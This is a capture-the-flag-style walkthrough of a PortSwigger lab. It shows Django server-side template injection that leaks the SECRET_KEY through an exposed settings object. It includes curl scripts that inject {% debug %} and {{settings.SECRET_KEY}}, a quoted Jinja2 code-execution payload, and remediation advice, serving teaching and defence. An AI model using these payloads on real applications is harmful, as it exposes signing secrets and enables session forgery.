---
layout: post
title: "PortSwigger: SSTI with information disclosure via user-supplied objects"
date: 2027-11-05 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, SSTI]
tags: [portswigger, ssti, template-injection, django, information-disclosure, secret-key, cwe-1336]
---

Most server-side template injection labs end in remote code execution. This one doesn't — and that's the lesson. The engine is **Django**, whose template language is deliberately sandboxed: the usual `__class__`/`__globals__` gadget chain is dead on arrival. But a sandboxed engine still **walks the attributes of any object the developer left in template scope**, and the app left the framework's `settings` object there. So `{{settings.SECRET_KEY}}` reads the application secret with no code execution at all. This is **SSTI as pure information disclosure** ([CWE-1336](https://cwe.mitre.org/data/definitions/1336.html)).

## Overview

A content manager can edit a product description **template** at `GET /product/template?productId=1`. The default markup looks like:

```
<p>Hurry! Only {{product.stock}} left of {{product.name}} at {{product.price}}.</p>
```

Those `{{ ... }}` interpolations are evaluated server-side by Django. Whatever you type into the template is rendered — so the template field is the injection point. The goal is to leak the Django `SECRET_KEY` and submit it.

Log in first with the standard content-author credentials the lab provides:

- Username: `content-manager`
- Password: `C0nt3ntM4n4g3r`

## Fingerprinting the engine

The `{{ }}` syntax says "Jinja-like" but doesn't distinguish Django from Jinja2 — and that distinction matters, because the Jinja2 RCE payload won't work here. The tell is Django's built-in **`{% debug %}`** tag, which dumps the entire template context (every variable and object, plus loaded modules) into the rendered output:

```bash
U="https://<id>.web-security-academy.net"
CSRF=$(curl -sk -b c.txt "$U/product/template?productId=1" | grep -oP 'name="csrf" value="\K[^"]+')
curl -sk -b c.txt "$U/product/template?productId=1" \
  --data-urlencode "csrf=$CSRF" \
  --data-urlencode 'template={% debug %}' \
  --data-urlencode 'template-action=preview'
```

`{% debug %}` is a Django-only tag, so a context dump (rather than a syntax error) both confirms the engine **and** reveals which privileged objects are in scope — here, `settings`.

## Why object traversal works

Django's template language is sandboxed on purpose. You cannot reach Python internals like `__class__`, `__init__`, or `__globals__`, which is exactly what the Jinja2 RCE chain `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` depends on. That chain fails.

What Django **does** allow is dot-traversal of attributes and dictionary keys on any object already in the render context. The application injected its own configuration — Django's `django.conf.settings` — into that context. So:

```
{{settings.SECRET_KEY}}
```

walks straight to `settings.SECRET_KEY`. No sandbox escape, no code execution — just reading a property of an object that should never have been exposed to a user-controlled template.

## Leaking the key

```bash
# 1. log in as the content author
CSRF=$(curl -sk -c c.txt "$U/login" | grep -oP 'name="csrf" value="\K[^"]+')
curl -sk -b c.txt -c c.txt "$U/login" \
  -d "csrf=$CSRF" -d "username=content-manager" -d "password=C0nt3ntM4n4g3r"

# 2. inject {{settings.SECRET_KEY}} and preview
CSRF=$(curl -sk -b c.txt "$U/product/template?productId=1" | grep -oP 'name="csrf" value="\K[^"]+')
curl -sk -b c.txt "$U/product/template?productId=1" \
  --data-urlencode "csrf=$CSRF" \
  --data-urlencode 'template={{settings.SECRET_KEY}}' \
  --data-urlencode 'template-action=preview'
```

The rendered preview comes back inside the result div with the secret in plain text:

```html
<div id=preview-result>
    5771vg8hjf4mf6c696ebxzyau2skhck5
</div>
```

Submitting that key (`POST /submitSolution`, `answer=<key>`) returns `{"correct":true}` and the lab flips to **Solved**.

## Why it matters

A "safe", sandboxed template engine creates a false sense of security. The sandbox stops code execution, but it does nothing to stop **reading secrets out of objects you handed to the template**. The Django `SECRET_KEY` signs sessions and CSRF tokens; leaking it enables session forgery and other downstream attacks. The same idea generalizes: when the dunder gadgets are blocked, pivot to attribute navigation over whatever trusted objects (`settings`, `request`, `user`) the developer left in scope, using `{% debug %}` to enumerate them.

## The fix

- **Never pass framework configuration objects into a user-controlled template context.** The template should only receive the exact fields it needs — `product.name`, `product.price`, `product.stock` — as bound data, not whole objects with sensitive attributes.
- Treat user-authored templates as untrusted code even on a sandboxed engine. Whitelist the allowed variables; don't expose `settings`, `request`, ORM model instances, or anything that can reach secrets.
- Keep secrets like `SECRET_KEY` out of any object reachable from rendering, and rotate them if exposure is suspected.

**CWE:** [CWE-1336 — Improper Neutralization of Special Elements Used in a Template Engine](https://cwe.mitre.org/data/definitions/1336.html)
